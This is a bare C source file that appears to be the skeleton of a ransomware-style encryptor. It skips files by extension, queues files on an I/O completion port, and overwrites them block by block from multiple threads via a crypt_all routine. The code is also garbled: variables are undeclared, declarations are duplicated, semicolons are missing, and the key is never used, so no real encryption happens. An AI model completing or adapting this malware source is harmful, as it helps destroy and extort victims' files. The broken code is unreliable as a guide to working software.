#define OMIT_LENGHT 512
#define SHOULD_OMIT 2048

char *exclude[]={".pdf",".txt"};
HANDLE CompletionPort;

int should_crypt(char *file)
{
for(i=0;i!=sizeof(exclude)/sizeof(char*);i++)
{
if(strstr(file,exclude[i])!=NULL)
{
return 0;
}
}
return 1;
}
void associate_file(char *filename)
{
HANDLE file = CreateFileA(filename,GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL);
      overlapped_enc *new_ovl = (overlapped_enc*)malloc(sizeof(overlapped_enc));
      memset(new_ovl,0,sizeof(overlapped_enc));
      ovl->file = file;
      LARGE_INTEGER li;
      GetFileSizeEx(file,&li);
      ovl->file_size = li.QuadPart;
      if(new_ovl->file_size > BLOCK_SIZE)
      {
new_ovl->operation = HANDLE_EOF;
      }
      else
      {
new_ovl->operation = READ;
      }
      if( CreateIoCompletionPort(CompletionPort,file,0,0) == NULL)
      {
return 1;
      }
      if(!PostQueuedCompletionStatus(CompletionPort,0,0,(LPOVERLAPPED *)new_ovl))
      {
return 1;    
      }
return 0;;


}
void block_read(overlapped_enc *ovl)
{
LARGE_INTEGER li;
li.QuadPart = (ovl->current_block * BLOCK_SIZE);
ovl->overlapped.Offset = li.LowPart;
ovl->overlapped.OffsetHigh = li.HighPart;
      BOOL res = ReadFile(ovl->file,inpbuff,BLOCK_SIZE,NULL,(LPOVERLAPPED)ovl);
ovl->operation = WRITE;
      PostQueuedCompletionStatus(CompletionPort,0,0, (LPOVERLAPPED)ovl);
      return ;
}
void block_write(overlapped_enc *ovl)
{     
    memcpy(ovl->inpbuff,ovl->outbuff,BLOCK_SIZE);
    BOOL res = WriteFile(ovl->file,outbuff,BLOCK_SIZE,NULL,(LPOVERLAPPED)ovl);
ovl->current_block +=1;
    ULONGLONG next_offset = (ovl->current_block * BLOCK_SIZE) + BLOCK_SIZE ;
      
if(next_offset >= ovl->file_size)
{
ovl->operation = HANDLE_EOF;
}
else
{
ovl->operation = READ;
}
  
  PostQueuedCompletionStatus(CompletionPort, 0, 0, (LPOVERLAPPED)ovl);
 return ;



}
void handle_eof(overlapped_enc *ovl)
{
      memset(ovl->tempbuff,0,BLOCK_SIZE);
BOOL res = ReadFile(ovl->file,tempbuff,BLOCK_SIZE,NULL,(LPOVERLAPPED)ovl);

BOOL res = WriteFile(ovl->file,tempbuff,BLOCK_SIZE,NULL,(LPOVERLAPPED)ovl);
ovl->operation = CLOSE_IO;
  PostQueuedCompletionStatus(CompletionPort,0,0,(LPOVERLAPPED)ovl);
      return;
}
void close_io(overlapped_enc *ovl)
{
CancelIo(ovl->file);
CloseFile(ovl->file);
      free(ovl);
      return;


}
void crypt(char *key)
{
BOOL result;
DWORD CompletionKey;
overlapped_enc *OverLapped;
LONGLONG offset;
while(1)
  {
result = GetQueuedCompletionStatus(CompletionPort,&NumberOfBytes,CompletionKey,(LPOVERLAPPED*)&OverLapped,5000);
switch(OverLapped->operation)
  {
    case WRITE:
 block_write(OverLapped);   
    break;
        
    case READ:
block_read(OverLapped);
    break;
        
    case HANDLE_EOF:
handle_eof(OverLapped);
    break;

    case CLOSE_IO:
close_io(OverLapped);
    break;
  }
  }
}

void crypt_all(char *key)
{
DWORD threads;
HANDLE thread;
  CompletionPort = CreateIoCompletionPort(INVALID_HANDLE_VALUE,0,0,threads)
    if(CompletionPort)
  {
do
  {
thread = CreateThread(0,0,crypt,key,0,0)

threads--
  }
while(threads)
  }

}
